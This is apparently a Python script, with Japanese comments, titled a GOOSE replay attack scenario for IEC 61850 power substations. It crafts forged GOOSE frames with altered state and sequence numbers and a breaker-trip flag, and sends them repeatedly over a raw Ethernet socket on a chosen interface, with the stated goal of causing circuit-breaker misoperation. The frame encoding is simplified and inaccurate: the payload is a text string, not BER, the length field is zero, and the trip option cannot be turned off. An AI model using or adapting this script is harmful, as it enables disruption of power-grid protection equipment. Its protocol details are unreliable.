#!/usr/bin/env python3
"""goose_replay_attack.py — GOOSE複製・再送攻撃シナリオ（Phase 9.5 決定事項#139）。

電力サブステーション（IEC 61850）環境において、過去に観測された正常な GOOSE メッセージ
（イーサネット直載せ EtherType 0x88B8、マルチキャスト宛先 01:0c:cd:01:00:01 等）を
複製し、状態番号 (StNum) やシーケンス番号 (SqNum) を改ざん・急速再送することで、
遮断器（CB: Circuit Breaker）の誤動作や制御妨害を引き起こす攻撃パケットを送出する。

本スクリプトは標準ライブラリ（socket / time / struct）のみで動作し、
外部依存なしで各種テスト・デモ環境において補助実演を行う。
"""

from __future__ import annotations

import argparse
import socket
import struct
import sys
import time

# GOOSE 標準イーサネットタイプ
ETH_P_GOOSE = 0x88B8
DEFAULT_GOOSE_MAC = "01:0c:cd:01:00:01"


def build_goose_frame(
    src_mac: str = "02:00:00:00:00:01",
    dst_mac: str = DEFAULT_GOOSE_MAC,
    appid: int = 0x0001,
    gocb_ref: str = "PowerGrid/LLN0$GO$gocb01",
    datset: str = "PowerGrid/LLN0$DS01",
    go_id: str = "PowerGrid_GOOSE_01",
    st_num: int = 1,
    sq_num: int = 0,
    breaker_tripped: bool = True,
) -> bytes:
    """簡易的な GOOSE PDU (ASN.1 BER 表現を模倣したパケットバイナリ) を生成する。"""
    # Destination MAC & Source MAC
    dst_bytes = bytes.fromhex(dst_mac.replace(":", ""))
    src_bytes = bytes.fromhex(src_mac.replace(":", ""))
    eth_header = dst_bytes + src_bytes + struct.pack(">H", ETH_P_GOOSE)

    # GOOSE APPID (2 bytes) + Length (2 bytes) + Reserved (4 bytes)
    pdu_header = struct.pack(">HHII", appid, 0, 0, 0)

    # 簡易ペイロードデータ（gocbRef, stNum, sqNum, データセット等）
    payload_data = (
        f"gocbRef={gocb_ref};datSet={datset};goID={go_id};"
        f"stNum={st_num};sqNum={sq_num};cbTripped={int(breaker_tripped)}"
    ).encode("utf-8")

    return eth_header + pdu_header + payload_data


def send_goose_replay(
    interface: str = "eth0",
    count: int = 5,
    interval: float = 0.5,
    st_num: int = 10,
    breaker_tripped: bool = True,
) -> int:
    """指定されたインターフェースへ Raw Socket (AF_PACKET) 経由で GOOSE 複製パケットを送出する。
    ソケット権限がない環境や非 Linux 環境では UDP テストモードへフォールバックする。
    """
    sent_bytes = 0
    try:
        # RAW ソケット（要 CAP_NET_RAW / NET_ADMIN）
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_GOOSE))
        s.bind((interface, 0))
        is_raw = True
    except (PermissionError, AttributeError, OSError):
        # 権限不足または非 Linux 環境（テスト用 UDP ソケットフォールバック）
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        is_raw = False

    for i in range(count):
        # シーケンス番号をインクリメントしながら複製パケットを送出
        frame = build_goose_frame(
            st_num=st_num, sq_num=i, breaker_tripped=breaker_tripped
        )
        if is_raw:
            s.send(frame)
        else:
            # フォールバック用: UDP ループバックまたはブロードキャスト宛先
            try:
                s.sendto(frame, ("127.0.0.1", 8888))
            except Exception:
                pass
        sent_bytes += len(frame)
        time.sleep(interval)

    s.close()
    return sent_bytes


def main() -> None:
    parser = argparse.ArgumentParser(
        description="GOOSE Replay Attack Scenario Script for IEC 61850"
    )
    parser.add_argument(
        "--interface", "-i", default="eth0", help="Network interface to send frames"
    )
    parser.add_argument(
        "--count", "-c", type=int, default=5, help="Number of replay frames to send"
    )
    parser.add_argument(
        "--interval", "-t", type=float, default=0.2, help="Interval between frames (s)"
    )
    parser.add_argument(
        "--st-num", type=int, default=100, help="Forged State Number (StNum)"
    )
    parser.add_argument(
        "--trip", action="store_true", default=True, help="Set breaker trip status to True"
    )
    args = parser.parse_args()

    print(
        f"[goose_replay_attack] Sending {args.count} forged GOOSE replay frames "
        f"on {args.interface} (StNum={args.st_num})..."
    )
    sent = send_goose_replay(
        interface=args.interface,
        count=args.count,
        interval=args.interval,
        st_num=args.st_num,
        breaker_tripped=args.trip,
    )
    print(f"[goose_replay_attack] Complete. Sent total {sent} bytes.")


if __name__ == "__main__":
    main()
